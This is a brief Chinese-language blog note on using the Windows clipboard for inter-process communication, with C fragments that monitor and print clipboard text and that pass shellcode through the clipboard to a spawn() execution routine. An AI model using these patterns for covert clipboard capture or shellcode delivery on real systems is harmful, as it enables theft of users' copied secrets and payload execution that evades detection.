# Clipboard Data Deliver

## 简介

我这水文居然还有人催更，就随便写点什么吧。

前几天同事叫我写个小demo，这里简单记录下，说需要监控剪贴板数据，实质也是一块共享内存，以往用剪贴板作为跨进程通信的方式传递过payload，常见的通信方式也就那么几种ReadFile/WriteFile,CreateMailslot,CreatePipe,socket,OpenClipboard,CreateFileMapping。

## 流程

1. OpenClipboard打开剪贴板
2. GetClipboardData指定格式检索获取对象
3. GlobalLock锁定内存对象获取指针
4. 读取数据
5. GlobalUnlock解锁全局对象
6. CloseClipboard关闭剪贴板

## 代码

### 监听

```text
    HGLOBAL   hglb;
    LPVOID    lptstr;
    SYSTEMTIME systemTime;
    if (!OpenClipboard(NULL)) { return; };
    hglb = GetClipboardData(CF_TEXT);
    if (hglb != NULL)
    {
        lptstr = GlobalLock(hglb);
        if (lptstr != NULL)
        {
            GetLocalTime(&systemTime);
            printf("%d.%d.%d %d:%d:%d\n", systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
            printf("%s\n", lptstr);
            fflush(stdout);
            GlobalUnlock(hglb);
        }
    }
    CloseClipboard();
```

### 传递

```text

    if (!OpenClipboard(NULL)) { return; };
    hGlobalCopy = GlobalAlloc(GMEM_MOVEABLE,sizeof(shellcode));

    lpCopy = GlobalLock(hGlobalCopy);
    memcpy(lpCopy, payload->payload, payload->length);
    GlobalUnlock(hGlobalCopy);

    SetClipboardData(CF_TEXT, hGlobalCopy);

    hGlobal = GetClipboardData(CF_TEXT);
    if (hGlobal != NULL)
    {
        lptstr = GlobalLock(hGlobal);
        if (lptstr != NULL)
        {
            memcpy(buffer, lptstr, payload->length);
            GlobalUnlock(hGlobal);
        }
    }
    EmptyClipboard();
    CloseClipboard();
    spawn(buffer, payload->length, payload->key);
    free(buffer);
    
```

## LINKS

{% embed url="https://docs.microsoft.com/zh-cn/windows/win32/dataxchg/clipboard?redirectedfrom=MSDN" %}



